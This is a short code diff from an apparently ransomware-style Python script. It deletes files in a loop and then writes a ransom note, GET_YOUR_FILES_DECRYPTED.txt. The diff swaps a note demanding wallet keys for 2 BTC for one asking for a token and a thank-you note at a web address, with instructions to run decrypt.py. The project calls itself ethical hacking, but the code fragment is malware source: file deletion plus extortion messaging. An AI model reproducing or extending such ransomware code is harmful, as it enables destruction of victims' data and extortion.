@@ -71,5 +71,5 @@ for file in myfiles:
   os.remove(path + '/' + file)
 
 f = open(path + '/GET_YOUR_FILES_DECRYPTED.txt', 'w')
-f.write("Your token = " + claim_token + ". Go to https://ethical-hacking-56322.web.app/ with YOUR TOKEN and secret keys to a wallet full of 2 BTC and a PDF of a handwritten thank you letter to ever see your files again. DELETE THIS FILE BEFORE DECRYPTING USING decrypt.py")
+f.write("Your token = " + claim_token + ". We are feeling generous. Visit https://ethical-hacking-56322.web.app and enter YOUR TOKEN, as well as a thank you note to ever see your files again. DELETE THIS FILE AND .DS_STORE BEFORE DECRYPTING USING decrypt.py")
 f.close()
